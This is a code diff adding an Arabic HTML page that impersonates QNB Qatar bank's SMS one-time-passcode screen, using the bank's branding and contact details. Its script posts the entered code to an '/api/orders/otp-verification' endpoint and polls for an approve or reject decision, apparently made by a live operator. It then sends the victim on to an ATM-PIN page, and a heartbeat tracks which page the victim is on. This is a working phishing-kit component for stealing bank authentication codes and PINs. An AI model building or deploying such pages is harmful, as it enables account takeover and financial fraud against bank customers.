@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك QNB قطر - تأكيد رمز التحقق</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+            background-color: #F5F8FF;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-left img {
+            height: 42px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #ffffff;
+            background: #C41E3A;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .lang-btn:hover {
+            background-color: #A01830;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #000000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .phone-group {
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 22px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 3px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+
+        /* Main Wrapper - No extra gap */
+        .main-container {
+            margin-top: 75px;
+            padding: 20px 20px 60px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 75px);
+            background-color: #F5F8FF;
+        }
+
+        /* OTP Card */
+        .otp-card {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            overflow: hidden;
+            border: 1px solid #D6E4F0;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .otp-logo {
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 20px;
+        }
+
+        .otp-title {
+            font-size: 22px;
+            color: #002280;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .otp-desc {
+            font-size: 14.5px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* OTP Input Field */
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1A2744;
+            font-size: 14px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #B8D4E8;
+            border-radius: 8px;
+            font-size: 20px;
+            letter-spacing: 8px;
+            text-align: center;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+            font-weight: bold;
+        }
+        .form-control:focus {
+            border-color: #001F5C;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,86,179,0.08);
+        }
+
+        /* Submit Button */
+        .verify-btn {
+            background-color: #001F5C;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,51,160,0.2);
+        }
+        .verify-btn:hover {
+            background-color: #002280;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(0,51,160,0.3);
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: none;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #002280;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 10%,30%,50%,70%,90%{transform:translateX(-5px)} 20%,40%,60%,80%{transform:translateX(5px)} }
+        @media (max-width: 580px) {
+            .otp-card { border-radius: 0; box-shadow: none; border: none; padding: 20px; }
+            .main-container { padding: 0; margin-top: 70px; }
+        }
+    </style>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+        <header>
+        <div class="menu-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="header-left">
+            <img src="images/qnb-logo.png" alt="بنك QNB قطر">
+        </div>
+        <div class="header-right">
+            <a href="otp-en.html" class="lang-btn">English</a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="otp-card">
+            <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" alt="OTP Logo" class="otp-logo">
+            <h2 class="otp-title">رمز التحقق (OTP)</h2>
+            <p class="otp-desc">يرجى إدخال رمز التحقق المكون من 6 أرقام الذي تم إرساله إلى هاتفك.</p>
+
+            <form id="otpForm">
+                <div class="form-group">
+                    <label for="otp_code">رمز SMS</label>
+                    <input type="text" id="otp_code" name="otp_code" class="form-control" required placeholder="••••••" maxlength="6" autocomplete="one-time-code">
+                </div>
+
+                <button type="submit" class="verify-btn">تأكيد</button>
+            </form>
+        </div>
+    </div>
+
+            <footer style="background-color: #001F5C; color: #ffffff; padding: 60px 20px 30px 20px; margin-top: 60px;">
+        <div class="footer-container">
+            <a href="index.html"><img src="images/qnb-logo.png" alt="بنك QNB قطر" class="footer-logo"></a>
+            <div class="footer-info">
+                <strong>بنك قطر الوطني (QNB)</strong>
+                <span>الدوحة - دولة قطر</span>
+                <span>الهاتف: +974 4440 7777</span>
+                <span>البريد الإلكتروني: info@qnb.com.qa</span>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 بنك قطر الوطني. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay (blue) -->
+    <div id="loadingOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#001F5C;z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="width:90px;height:90px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
+            <div style="width:45px;height:45px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ffffff;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;">يتم التحقق من الرمز...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">يرجى الانتظار، جاري معالجة العملية.</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
+        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
+            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
+            <h3 style="color:#dc3545;margin-bottom:10px;" id="errorTitle">الرمز غير صحيح</h3>
+            <p style="color:#555;font-size:15px;" id="errorMessage">الرمز الذي أدخلته غير صحيح. يرجى التحقق من الرمز المرسل إلى هاتفك والمحاولة مرة أخرى.</p>
+            <button onclick="closeOtpErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">إعادة المحاولة</button>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        let pollInterval = null;
+
+        async function pollOtpStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    const nextPages = {
+                        'loading_otp': 'otp.html',
+                        'otp': 'otp.html',
+                        'loading_atm': 'atm-pin.html',
+                        'atm_pin': 'atm-pin.html',
+                        'loading_success': 'success.html',
+                        'success': 'success.html'
+                    };
+                    window.location.href = nextPages[data.currentPage] || 'atm-pin.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    if (data.message) {
+                        document.getElementById('errorMessage').textContent = data.message;
+                    }
+                    showOtpErrorModal();
+                }
+            } catch (err) {
+                console.error('Poll error:', err);
+            }
+        }
+
+        function showOtpErrorModal() {
+            document.getElementById('errorModal').style.display = 'flex';
+        }
+
+        function closeOtpErrorModal() {
+            document.getElementById('errorModal').style.display = 'none';
+            document.getElementById('otp_code').value = '';
+        }
+
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) {
+                alert('خطأ: لم يتم العثور على رقم الطلب');
+                window.location.href = 'data.html';
+                return;
+            }
+
+            const formData = new FormData(e.target);
+            const data = {
+                orderId,
+                ...Object.fromEntries(formData)
+            };
+
+            try {
+                const response = await fetch('/api/orders/otp-verification', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    document.getElementById('loadingOverlay').style.display = 'flex';
+                    pollInterval = setInterval(pollOtpStatus, 2000);
+                } else {
+                    alert('خطأ: ' + result.error);
+                }
+            } catch (err) {
+                alert('حدث خطأ في الاتصال بالخادم');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
+</body>
+</html>
